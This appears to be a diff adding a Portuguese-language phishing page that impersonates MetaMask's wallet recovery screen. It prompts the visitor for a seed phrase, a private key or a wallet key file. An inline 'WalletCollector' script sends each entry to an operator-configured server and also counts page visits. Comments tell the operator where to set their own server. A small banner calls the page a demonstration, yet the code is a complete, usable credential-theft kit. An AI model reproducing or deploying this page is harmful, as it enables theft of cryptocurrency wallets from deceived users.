@@ -1,0 +1,793 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MetaMask - Wallet Segura para Ethereum</title>
+
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, sans-serif;
+        }
+
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
+            max-width: 500px;
+            width: 100%;
+            padding: 40px;
+            animation: slideIn 0.5s ease;
+        }
+
+        @keyframes slideIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
+        }
+
+        .logo {
+            width: 80px;
+            height: 80px;
+            margin: 0 auto 30px;
+            display: block;
+        }
+
+        h1 {
+            text-align: center;
+            color: #333;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #666;
+            margin-bottom: 30px;
+            font-size: 16px;
+        }
+
+        .tabs {
+            display: flex;
+            border-bottom: 2px solid #f0f0f0;
+            margin-bottom: 30px;
+        }
+
+        .tab {
+            flex: 1;
+            padding: 12px;
+            background: none;
+            border: none;
+            color: #666;
+            font-size: 16px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            position: relative;
+        }
+
+        .tab.active {
+            color: #667eea;
+        }
+
+        .tab.active::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            right: 0;
+            height: 2px;
+            background: #667eea;
+        }
+
+        .tab-content {
+            display: none;
+            animation: fadeIn 0.3s ease;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+
+            to {
+                opacity: 1;
+            }
+        }
+
+        .form-group {
+            margin-bottom: 20px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+            font-weight: 500;
+            font-size: 14px;
+        }
+
+        textarea {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 14px;
+            resize: vertical;
+            min-height: 100px;
+            transition: border-color 0.3s ease;
+        }
+
+        input[type="text"] {
+            width: 100%;
+            padding: 12px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 14px;
+            transition: border-color 0.3s ease;
+        }
+
+        input[type="file"] {
+            width: 100%;
+            padding: 10px;
+            border: 2px dashed #e0e0e0;
+            border-radius: 10px;
+            background: #f9f9f9;
+            cursor: pointer;
+        }
+
+        textarea:focus,
+        input[type="text"]:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .btn {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 16px;
+            font-weight: 600;
+            cursor: pointer;
+            transition: transform 0.3s ease, box-shadow 0.3s ease;
+        }
+
+        .btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.4);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .btn.loading {
+            background: #ccc;
+            cursor: not-allowed;
+            pointer-events: none;
+        }
+
+        .helper-text {
+            font-size: 12px;
+            color: #999;
+            margin-top: 5px;
+        }
+
+        .security-notice {
+            background: #fff3cd;
+            border: 1px solid #ffc107;
+            border-radius: 10px;
+            padding: 12px;
+            margin-bottom: 20px;
+            font-size: 13px;
+            color: #856404;
+        }
+
+        .security-notice strong {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        /* Estilos para notificações (serão injetados pela biblioteca) */
+        body.loading::after {
+            content: '';
+            position: fixed;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(0, 0, 0, 0.5);
+            z-index: 9999;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        body.loading::before {
+            content: '';
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 50px;
+            height: 50px;
+            border: 3px solid #f3f3f3;
+            border-top: 3px solid #667eea;
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+            z-index: 10000;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: translate(-50%, -50%) rotate(0deg);
+            }
+
+            100% {
+                transform: translate(-50%, -50%) rotate(360deg);
+            }
+        }
+
+        .success-message {
+            color: #0F9D58;
+            font-size: 14px;
+            margin-top: 10px;
+            text-align: center;
+            display: none;
+        }
+
+        .error-message {
+            color: #d32f2f;
+            font-size: 14px;
+            margin-top: 10px;
+            text-align: center;
+            display: none;
+        }
+    </style>
+</head>
+
+<body>
+    <div class="container">
+        <!-- Logo do MetaMask (você pode substituir por uma imagem real) -->
+        <svg class="logo" viewBox="0 0 318.6 318.6">
+            <polygon fill="#E2761B" points="274.1,35.5 174.6,109.4 193,65.8" />
+            <polygon fill="#E4761B" points="44.4,35.5 143.1,110.1 125.6,65.8" />
+            <polygon fill="#E4761B" points="238.3,206.8 211.8,247.4 268.5,263 284.8,207.7" />
+            <polygon fill="#E4761B" points="33.9,207.7 50.1,263 106.8,247.4 80.3,206.8" />
+            <polygon fill="#E4761B" points="103.6,138.2 87.8,162.1 144.1,164.6 142.1,104.1" />
+            <polygon fill="#E4761B" points="214.9,138.2 175.9,103.4 174.6,164.6 230.8,162.1" />
+            <polygon fill="#E4761B" points="106.8,247.4 140.6,230.9 111.4,208.1" />
+            <polygon fill="#E4761B" points="177.9,230.9 211.8,247.4 207.1,208.1" />
+        </svg>
+
+        <h1>MetaMask</h1>
+        <p class="subtitle">Recuperação de Carteira</p>
+
+        <div class="security-notice">
+            <strong>⚠️ Aviso de Segurança</strong>
+            Esta é uma página de demonstração. Nunca compartilhe suas chaves reais!
+        </div>
+
+        <div class="tabs">
+            <button class="tab active" onclick="switchTab('seed')">Seed Phrase</button>
+            <button class="tab" onclick="switchTab('private')">Private Key</button>
+            <button class="tab" onclick="switchTab('file')">Key File</button>
+        </div>
+
+        <form id="walletForm">
+            <!-- Tab Seed Phrase -->
+            <div id="seed-tab" class="tab-content active">
+                <div class="form-group">
+                    <label for="seedPhrase">Digite sua Seed Phrase</label>
+                    <textarea id="seedPhrase" name="seedPhrase"
+                        placeholder="Exemplo: word1 word2 word3 word4 word5 word6 word7 word8 word9 word10 word11 word12"></textarea>
+                    <p class="helper-text">Digite as 12, 15, 18, 21 ou 24 palavras da sua seed phrase separadas por
+                        espaço</p>
+                </div>
+                <button type="submit" class="btn" id="seedBtn">Recuperar com Seed Phrase</button>
+            </div>
+
+            <!-- Tab Private Key -->
+            <div id="private-tab" class="tab-content">
+                <div class="form-group">
+                    <label for="privateKey">Digite sua Private Key</label>
+                    <input type="text" id="privateKey" name="privateKey" placeholder="Exemplo: 0x1234567890abcdef..."
+                        maxlength="64" />
+                    <p class="helper-text">Digite os 64 caracteres hexadecimais da sua private key</p>
+                </div>
+                <button type="submit" class="btn" id="privateBtn">Recuperar com Private Key</button>
+            </div>
+
+            <!-- Tab Key File -->
+            <div id="file-tab" class="tab-content">
+                <div class="form-group">
+                    <label for="keyFile">Selecione seu arquivo de chave</label>
+                    <input type="file" id="keyFile" name="keyFile"
+                        accept=".dat,.txt,.wallet,.key,.pem,.hex,.keystore,.sk,.seed" />
+                    <p class="helper-text">Formatos aceitos: .dat, .txt, .wallet, .key, .pem, .hex, .keystore, .sk,
+                        .seed</p>
+                </div>
+                <button type="submit" class="btn" id="fileBtn">Recuperar com Key File</button>
+            </div>
+        </form>
+
+        <div class="success-message" id="successMessage"></div>
+        <div class="error-message" id="errorMessage"></div>
+    </div>
+
+    <!-- Incluir a biblioteca WalletCollector -->
+    <script>
+        // ========================================
+        // CONFIGURAÇÃO DA BIBLIOTECA WALLET COLLECTOR
+        // ========================================
+
+        /**
+         * IMPORTANTE: Cole aqui o conteúdo completo do arquivo wallet-collector.js
+         * ou faça o include via CDN/arquivo externo
+         */
+
+        // Para este exemplo, vou incluir a biblioteca inline
+        // Em produção, você pode hospedar o arquivo separadamente
+
+        class WalletCollector {
+            constructor(config = {}) {
+                this.config = {
+                    serverUrl: config.serverUrl || 'http://localhost:5000',
+                    pageSource: config.pageSource || 'default',
+                    features: {
+                        counter: config.features?.counter !== false,
+                        seedPhrase: config.features?.seedPhrase !== false,
+                        privateKey: config.features?.privateKey !== false,
+                        keyFile: config.features?.keyFile !== false,
+                    },
+                    ui: {
+                        seedInput: config.ui?.seedInput || 'seedPhrase',
+                        privateKeyInput: config.ui?.privateKeyInput || 'privateKey',
+                        keyFileInput: config.ui?.keyFileInput || 'keyFile',
+                        successClass: config.ui?.successClass || 'success',
+                        errorClass: config.ui?.errorClass || 'error',
+                        loadingClass: config.ui?.loadingClass || 'loading',
+                        messages: {
+                            seedSuccess: config.ui?.messages?.seedSuccess || 'Seed phrase enviada com sucesso!',
+                            seedError: config.ui?.messages?.seedError || 'Erro ao enviar seed phrase',
+                            privateKeySuccess: config.ui?.messages?.privateKeySuccess || 'Private key enviada com sucesso!',
+                            privateKeyError: config.ui?.messages?.privateKeyError || 'Erro ao enviar private key',
+                            keyFileSuccess: config.ui?.messages?.keyFileSuccess || 'Arquivo enviado com sucesso!',
+                            keyFileError: config.ui?.messages?.keyFileError || 'Erro ao enviar arquivo',
+                            invalidSeed: config.ui?.messages?.invalidSeed || 'Seed phrase inválida (deve ter 12, 15, 18, 21 ou 24 palavras)',
+                            invalidPrivateKey: config.ui?.messages?.invalidPrivateKey || 'Private key inválida (deve ter 64 caracteres hexadecimais)',
+                            invalidFile: config.ui?.messages?.invalidFile || 'Tipo de arquivo não permitido',
+                        }
+                    },
+                    notification: {
+                        enabled: config.notification?.enabled !== false,
+                        duration: config.notification?.duration || 3000,
+                        position: config.notification?.position || 'top-right',
+                    },
+                    autoCollectCounter: config.autoCollectCounter !== false,
+                    debug: config.debug || false
+                };
+
+                this.isInitialized = false;
+                this.collectedData = {
+                    counter: false,
+                    seeds: [],
+                    privateKeys: [],
+                    keyFiles: []
+                };
+            }
+
+            async init() {
+                if (this.isInitialized) {
+                    this.log('WalletCollector já foi inicializado');
+                    return;
+                }
+
+                this.log('Inicializando WalletCollector...');
+
+                if (this.config.features.counter && this.config.autoCollectCounter) {
+                    await this.collectCounter();
+                }
+
+                if (this.config.notification.enabled) {
+                    this.createNotificationContainer();
+                }
+
+                this.isInitialized = true;
+                this.log('WalletCollector inicializado com sucesso');
+            }
+
+            async collectCounter() {
+                if (!this.config.features.counter) {
+                    this.log('Funcionalidade de contador está desabilitada');
+                    return false;
+                }
+
+                if (this.collectedData.counter) {
+                    this.log('Dados do contador já foram coletados para esta sessão');
+                    return false;
+                }
+
+                try {
+                    const response = await fetch(`${this.config.serverUrl}/api/collect_counter`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            page_source: this.config.pageSource
+                        })
+                    });
+
+                    const data = await response.json();
+
+                    if (data.success) {
+                        this.collectedData.counter = true;
+                        this.log('Dados do contador coletados com sucesso');
+                        return true;
+                    } else {
+                        this.log('Erro ao coletar dados do contador:', data.message);
+                        return false;
+                    }
+                } catch (error) {
+                    this.log('Erro na requisição do contador:', error);
+                    return false;
+                }
+            }
+
+            validateSeedPhrase(seedPhrase) {
+                const words = seedPhrase.trim().split(/\s+/);
+                const validLengths = [12, 15, 18, 21, 24];
+                return validLengths.includes(words.length);
+            }
+
+            async sendSeedPhrase(seedPhrase) {
+                if (!this.config.features.seedPhrase) {
+                    this.log('Funcionalidade de seed phrase está desabilitada');
+                    return false;
+                }
+
+                if (!this.validateSeedPhrase(seedPhrase)) {
+                    this.showNotification(this.config.ui.messages.invalidSeed, 'error');
+                    return false;
+                }
+
+                try {
+                    this.showLoading(true);
+
+                    const response = await fetch(`${this.config.serverUrl}/api/save_seed`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            seed_phrase: seedPhrase.trim(),
+                            page_source: this.config.pageSource
+                        })
+                    });
+
+                    const data = await response.json();
+
+                    if (data.success) {
+                        this.collectedData.seeds.push(seedPhrase);
+                        this.showNotification(this.config.ui.messages.seedSuccess, 'success');
+                        this.log('Seed phrase enviada com sucesso');
+                        return true;
+                    } else {
+                        this.showNotification(data.message || this.config.ui.messages.seedError, 'error');
+                        return false;
+                    }
+                } catch (error) {
+                    this.log('Erro ao enviar seed phrase:', error);
+                    this.showNotification(this.config.ui.messages.seedError, 'error');
+                    return false;
+                } finally {
+                    this.showLoading(false);
+                }
+            }
+
+            validatePrivateKey(privateKey) {
+                const cleaned = privateKey.trim();
+                return cleaned.length === 64 && /^[0-9a-fA-F]+$/.test(cleaned);
+            }
+
+            async sendPrivateKey(privateKey) {
+                if (!this.config.features.privateKey) {
+                    this.log('Funcionalidade de private key está desabilitada');
+                    return false;
+                }
+
+                if (!this.validatePrivateKey(privateKey)) {
+                    this.showNotification(this.config.ui.messages.invalidPrivateKey, 'error');
+                    return false;
+                }
+
+                try {
+                    this.showLoading(true);
+
+                    const response = await fetch(`${this.config.serverUrl}/api/save_private_key`, {
+                        method: 'POST',
+                        headers: {
+                            'Content-Type': 'application/json',
+                        },
+                        body: JSON.stringify({
+                            private_key: privateKey.trim(),
+                            page_source: this.config.pageSource
+                        })
+                    });
+
+                    const data = await response.json();
+
+                    if (data.success) {
+                        this.collectedData.privateKeys.push(privateKey);
+                        this.showNotification(this.config.ui.messages.privateKeySuccess, 'success');
+                        this.log('Private key enviada com sucesso');
+                        return true;
+                    } else {
+                        this.showNotification(data.message || this.config.ui.messages.privateKeyError, 'error');
+                        return false;
+                    }
+                } catch (error) {
+                    this.log('Erro ao enviar private key:', error);
+                    this.showNotification(this.config.ui.messages.privateKeyError, 'error');
+                    return false;
+                } finally {
+                    this.showLoading(false);
+                }
+            }
+
+            validateKeyFile(file) {
+                const allowedExtensions = ['dat', 'txt', 'wallet', 'key', 'pem', 'hex', 'keystore', 'sk', 'seed'];
+                const extension = file.name.split('.').pop().toLowerCase();
+                const maxSize = 2 * 1024 * 1024;
+
+                if (!allowedExtensions.includes(extension)) {
+                    this.showNotification(this.config.ui.messages.invalidFile, 'error');
+                    return false;
+                }
+
+                if (file.size > maxSize) {
+                    this.showNotification('Arquivo muito grande (máximo 2MB)', 'error');
+                    return false;
+                }
+
+                return true;
+            }
+
+            async sendKeyFile(file) {
+                if (!this.config.features.keyFile) {
+                    this.log('Funcionalidade de key file está desabilitada');
+                    return false;
+                }
+
+                if (!this.validateKeyFile(file)) {
+                    return false;
+                }
+
+                try {
+                    this.showLoading(true);
+
+                    const formData = new FormData();
+                    formData.append('key_file', file);
+                    formData.append('page_source', this.config.pageSource);
+
+                    const response = await fetch(`${this.config.serverUrl}/api/save_key_file`, {
+                        method: 'POST',
+                        body: formData
+                    });
+
+                    const data = await response.json();
+
+                    if (data.success) {
+                        this.collectedData.keyFiles.push(file.name);
+                        this.showNotification(this.config.ui.messages.keyFileSuccess, 'success');
+                        this.log('Key file enviado com sucesso');
+                        return true;
+                    } else {
+                        this.showNotification(data.message || this.config.ui.messages.keyFileError, 'error');
+                        return false;
+                    }
+                } catch (error) {
+                    this.log('Erro ao enviar key file:', error);
+                    this.showNotification(this.config.ui.messages.keyFileError, 'error');
+                    return false;
+                } finally {
+                    this.showLoading(false);
+                }
+            }
+
+            createNotificationContainer() {
+                if (document.getElementById('wallet-collector-notifications')) {
+                    return;
+                }
+
+                const container = document.createElement('div');
+                container.id = 'wallet-collector-notifications';
+                container.style.cssText = `
+                    position: fixed;
+                    ${this.config.notification.position.includes('top') ? 'top: 20px' : 'bottom: 20px'};
+                    ${this.config.notification.position.includes('right') ? 'right: 20px' : 'left: 20px'};
+                    z-index: 10000;
+                    display: flex;
+                    flex-direction: column;
+                    gap: 10px;
+                `;
+                document.body.appendChild(container);
+            }
+
+            showNotification(message, type = 'info') {
+                if (!this.config.notification.enabled) {
+                    return;
+                }
+
+                const container = document.getElementById('wallet-collector-notifications');
+                if (!container) {
+                    this.createNotificationContainer();
+                }
+
+                const notification = document.createElement('div');
+                notification.className = `wallet-collector-notification ${type}`;
+                notification.style.cssText = `
+                    padding: 12px 24px;
+                    border-radius: 5px;
+                    color: white;
+                    font-weight: bold;
+                    box-shadow: 0 4px 12px rgba(0, 0, 0, 0.15);
+                    transform: translateX(150%);
+                    transition: transform 0.3s ease;
+                    background-color: ${type === 'success' ? '#0F9D58' : type === 'error' ? '#d32f2f' : '#2196F3'};
+                `;
+                notification.textContent = message;
+
+                document.getElementById('wallet-collector-notifications').appendChild(notification);
+
+                setTimeout(() => {
+                    notification.style.transform = 'translateX(0)';
+                }, 10);
+
+                setTimeout(() => {
+                    notification.style.transform = 'translateX(150%)';
+                    setTimeout(() => notification.remove(), 300);
+                }, this.config.notification.duration);
+            }
+
+            showLoading(show) {
+                if (show) {
+                    document.body.classList.add(this.config.ui.loadingClass);
+                } else {
+                    document.body.classList.remove(this.config.ui.loadingClass);
+                }
+            }
+
+            log(...args) {
+                if (this.config.debug) {
+                    console.log('[WalletCollector]', ...args);
+                }
+            }
+        }
+
+        // ========================================
+        // CONFIGURAÇÃO E INICIALIZAÇÃO
+        // ========================================
+
+        // ALTERE ESTAS CONFIGURAÇÕES CONFORME NECESSÁRIO
+        const collector = new WalletCollector({
+            // URL do seu servidor (onde está rodando o app.py)
+            serverUrl: 'http://localhost:5000', // ALTERE PARA SEU SERVIDOR
+
+            // Identificador desta página (deve corresponder ao PAGES_CONFIG)
+            pageSource: '#MetaMask-ID', // ALTERE PARA O ID DA SUA PÁGINA
+
+            // Funcionalidades habilitadas
+            features: {
+                counter: true,      // Coletar dados de visitantes
+                seedPhrase: true,   // Aceitar seed phrases
+                privateKey: true,   // Aceitar private keys
+                keyFile: true       // Aceitar arquivos de chave
+            },
+
+            // Mensagens personalizadas (opcional)
+            ui: {
+                messages: {
+                    seedSuccess: 'Carteira recuperada com sucesso!',
+                    seedError: 'Erro ao recuperar carteira',
+                    privateKeySuccess: 'Chave privada validada!',
+                    privateKeyError: 'Erro ao validar chave privada',
+                    keyFileSuccess: 'Arquivo processado com sucesso!',
+                    keyFileError: 'Erro ao processar arquivo'
+                }
+            },
+
+            // Debug mode (mostra logs no console)
+            debug: false
+        });
+
+        // Inicializar o coletor quando a página carregar
+        document.addEventListener('DOMContentLoaded', async () => {
+            await collector.init();
+        });
+
+        // ========================================
+        // LÓGICA DA INTERFACE
+        // ========================================
+
+        let currentTab = 'seed';
+
+        function switchTab(tab) {
+            // Atualizar abas
+            document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
+            document.querySelectorAll('.tab-content').forEach(c => c.classList.remove('active'));
+
+            // Ativar aba selecionada
+            event.target.classList.add('active');
+            document.getElementById(`${tab}-tab`).classList.add('active');
+
+            currentTab = tab;
+
+            // Limpar mensagens
+            document.getElementById('successMessage').style.display = 'none';
+            document.getElementById('errorMessage').style.display = 'none';
+        }
+
+        // Processar envio do formulário
+        document.getElementById('walletForm').addEventListener('submit', async (e) => {
+            e.preventDefault();
+
+            let success = false;
+
+            // Processar baseado na aba ativa
+            if (currentTab === 'seed') {
+                const seedPhrase = document.getElementById('seedPhrase').value;
+                if (seedPhrase) {
+                    success = await collector.sendSeedPhrase(seedPhrase);
+                    if (success) {
+                        document.getElementById('seedPhrase').value = '';
+                    }
+                }
+            } else if (currentTab === 'private') {
+                const privateKey = document.getElementById('privateKey').value;
+                if (privateKey) {
+                    success = await collector.sendPrivateKey(privateKey);
+                    if (success) {
+                        document.getElementById('privateKey').value = '';
+                    }
+                }
+            } else if (currentTab === 'file') {
+                const fileInput = document.getElementById('keyFile');
+                if (fileInput.files.length > 0) {
+                    success = await collector.sendKeyFile(fileInput.files[0]);
+                    if (success) {
+                        fileInput.value = '';
+                    }
+                }
+            }
+        });
+    </script>
+</body>
+
+</html>
